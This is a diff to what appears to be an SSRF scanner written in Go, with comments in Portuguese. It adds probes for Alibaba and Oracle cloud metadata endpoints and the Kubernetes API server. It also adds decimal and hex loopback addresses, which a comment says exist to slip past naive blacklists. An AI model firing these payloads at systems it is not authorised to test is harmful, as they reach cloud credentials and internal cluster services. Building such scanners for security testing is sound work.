@@ -31,6 +31,19 @@ var (
 	gcpMetaKeys   = []string{"instance/service-accounts", "project/project-id"}
 	azureMetaKeys = []string{"\"compute\"", "\"osType\"", "\"vmId\"", "azEnvironment"}
 	etcPasswdRe   = regexp.MustCompile(`root:.*:0:0:`)
+	// alibabaMetaKeys: campos exclusivos do formato de metadata da Alibaba
+	// Cloud (endpoint próprio 100.100.100.200, não o 169.254.169.254 comum
+	// a AWS/GCP/Azure/OCI/DO) — "region-id"/"owner-account-id" não aparecem
+	// nas outras clouds, evita colisão cruzada.
+	alibabaMetaKeys = []string{"region-id", "owner-account-id", "serial-number"}
+	// ociMetaKeys: campos exclusivos do JSON de metadata da Oracle Cloud
+	// Infrastructure (mesmo IP 169.254.169.254 das outras, path próprio).
+	ociMetaKeys = []string{"compartmentId", "availabilityDomain", "ociAdName"}
+	// k8sAPIKeys: mesmo sem token, o API server do Kubernetes responde com
+	// um JSON de erro reconhecível ("kind":"Status", "system:anonymous") —
+	// confirma que a requisição realmente alcançou o control plane do
+	// cluster, não só um 404 genérico de algum outro serviço na porta 443.
+	k8sAPIKeys = []string{"\"kind\":\"Status\"", "system:anonymous", "system:serviceaccount"}
 )
 
 func countHits(body string, keys []string) int {
@@ -79,12 +92,32 @@ func ssrfTargets() []ssrfTarget {
 			Label: "azure-metadata", URL: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Sev: "critical",
 			confirm: func(body string) bool { return countHits(body, azureMetaKeys) >= 2 },
 		},
+		{
+			Label: "alibaba-metadata", URL: "http://100.100.100.200/latest/meta-data/", Sev: "critical",
+			confirm: func(body string) bool { return countHits(body, alibabaMetaKeys) >= 1 },
+		},
+		{
+			Label: "oci-metadata", URL: "http://169.254.169.254/opc/v1/instance/", Sev: "critical",
+			confirm: func(body string) bool { return countHits(body, ociMetaKeys) >= 1 },
+		},
+		{
+			// serviço do Kubernetes sempre resolvível de DENTRO de um pod (DNS
+			// interno do cluster) — confirmação prova que o servidor alvo roda
+			// num cluster k8s e o SSRF alcança o control plane, mesmo sem token.
+			Label: "k8s-api-server", URL: "https://kubernetes.default.svc/version", Sev: "critical",
+			confirm: func(body string) bool { return countHits(body, k8sAPIKeys) >= 1 },
+		},
 		// localhost/loopback não tem assinatura genérica de conteúdo — vira
 		// candidato (probe() decide por diferencial contra o baseline), nunca
-		// finding confirmado sozinho.
+		// finding confirmado sozinho. As variantes decimal/hex existem pra não
+		// desistir cedo demais de um filtro que só bloqueia a string literal
+		// "127.0.0.1"/"localhost" — ambas resolvem pro mesmo endereço, mas não
+		// batem numa blacklist de string ingênua.
 		{Label: "localhost", URL: "http://127.0.0.1/", Sev: "medium"},
 		{Label: "localhost-name", URL: "http://localhost/", Sev: "medium"},
 		{Label: "ipv6-loopback", URL: "http://[::1]/", Sev: "medium"},
+		{Label: "localhost-decimal", URL: "http://2130706433/", Sev: "medium"},
+		{Label: "localhost-hex", URL: "http://0x7f000001/", Sev: "medium"},
 	}
 }
 
